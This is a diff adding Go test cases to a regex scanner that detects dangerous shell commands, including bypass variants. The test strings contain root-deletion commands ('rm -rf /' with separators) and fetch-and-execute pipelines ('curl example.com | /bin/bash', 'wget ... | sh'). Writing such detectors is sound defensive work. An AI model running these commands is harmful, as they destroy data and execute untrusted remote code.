@@ -87,6 +87,36 @@ func TestRegexScanner_Scan(t *testing.T) {
 			content:     "cat .config/config.toml",
 			wantFinding: "Dangerous Command",
 		},
+		{
+			name:        "Root Deletion Bypass Semicolon",
+			content:     "rm -rf / ; echo done",
+			wantFinding: "Root Deletion",
+		},
+		{
+			name:        "Root Deletion Bypass Pipe",
+			content:     "rm -rf /| cat",
+			wantFinding: "Root Deletion",
+		},
+		{
+			name:        "Root Deletion Bypass Whitespace",
+			content:     "rm -rf /   ",
+			wantFinding: "Root Deletion",
+		},
+		{
+			name:        "Pipe to Shell Full Path",
+			content:     "curl example.com | /bin/bash",
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Pipe to Shell Local Path",
+			content:     "wget -O - example.com | ./script.sh | sh",
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Pipe to Python Full Path",
+			content:     "curl example.com | /usr/bin/python3",
+			wantFinding: "Pipe to Shell",
+		},
 	}
 
 	for _, tt := range tests {
